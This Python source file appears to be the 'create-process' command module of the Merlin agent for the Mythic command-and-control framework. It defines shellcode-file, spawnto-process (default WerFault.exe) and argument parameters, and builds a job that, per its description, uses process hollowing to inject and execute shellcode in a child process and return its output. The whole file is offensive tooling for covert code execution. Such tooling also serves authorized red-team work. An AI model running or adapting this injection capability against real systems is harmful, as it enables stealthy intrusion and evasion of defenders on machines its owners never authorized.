
from merlin import MerlinJob, get_file_list, get_file_contents
from mythic_payloadtype_container.MythicCommandBase import *
from mythic_payloadtype_container.MythicRPC import *
import json


# Set to enable debug output to Mythic
debug = False


class CreateProcessArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="filename",
                cli_name="shellcode",
                type=ParameterType.ChooseOne,
                dynamic_query_function=get_file_list,
                description="The shellcode filename you want to execute in the spawnto process",
                parameter_group_info=[ParameterGroupInfo(
                    required=True,
                    group_name="Default",
                    ui_position=0,
                )],
            ),
            CommandParameter(
                name="file",
                type=ParameterType.File,
                description="The shellcode file you want to execute in the spawnto process",
                parameter_group_info=[ParameterGroupInfo(
                    required=True,
                    group_name="New File",
                    ui_position=0,
                )],
            ),
            CommandParameter(
                name="spawnto",
                cli_name="spawnto",
                type=ParameterType.String,
                description="The child process that will be started to execute the shellcode in",
                default_value="C:\\Windows\\System32\\WerFault.exe",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="Default",
                        ui_position=1,
                    ),
                    ParameterGroupInfo(
                        required=True,
                        group_name="New File",
                        ui_position=1,
                    )
                ],
            ),
            CommandParameter(
                name="spawnto arguments",
                cli_name="args",
                type=ParameterType.String,
                description="argument to create the spawnto process with, if any",
                parameter_group_info=[
                    ParameterGroupInfo(
                        group_name="Default",
                        ui_position=2,
                        required=False,
                    ),
                    ParameterGroupInfo(
                        group_name="New File",
                        ui_position=2,
                        required=False,
                    )
                ],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)


class CreateProcessCommand(CommandBase):
    cmd = "create-process"
    needs_admin = False
    help_cmd = "create-process <shellcode file name> <spawnto> <spawnto args>\n" \
               "create-process -shellcode <shellcode filename> -spawnto <spawnto> -args <spawnto args>"
    description = "Uses process hollowing to create a child process from the spawnto argument, allocate the provided " \
                  "shellcode into it, execute it, and use anonymous pipes to collect STDOUT/STDERR\n\nChange the " \
                  "Parameter Group to \"Default\" to use a shellcode file that was previously registered with Mythic " \
                  "and \"New File\" to register and use a new shellcode file from your host OS.\n"
    version = 1
    author = "@Ne0nd0g"
    argument_class = CreateProcessArguments
    attackmapping = ["T1055"]
    attributes = CommandAttributes(
        spawn_and_injectable=False,
        supported_os=[SupportedOS.Windows]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        if debug:
            await MythicRPC().execute(function_name="create_output", task_id=task.id, output=f'\n[DEBUG]Input task:{task}')

        filename, _, contents = await get_file_contents(task)

        task.display_params = f'{filename}' \
                              f'\nShellcode size: {len(contents)}\n' \
                              f'SpawnTo: {task.args.get_arg("spawnto")} ' \
                              f'{task.args.get_arg("spawntoargs")}'
        # 1. Shellcode
        # 2. SpawnTo Executable
        # 3. SpawnTo Arguments
        args = [
            contents,
            task.args.get_arg("spawnto"),
            task.args.get_arg("spawntoargs")
        ]

        # Merlin jobs.Command message type
        command = {
            "command": "createprocess",
            "args": args,
        }

        task.args.add_arg("type", MerlinJob.MODULE, ParameterType.Number)
        task.args.add_arg("payload", json.dumps(command), ParameterType.String)
        task.args.remove_arg("file")
        task.args.remove_arg("filename")
        task.args.remove_arg("spawnto")
        task.args.remove_arg("spawntoargs")

        if debug:
            await MythicRPC().execute("create_output", task_id=task.id, output=f'[DEBUG]Returned task:\r\n{task}\r\n')

        return task

    async def process_response(self, response: AgentResponse):
        pass
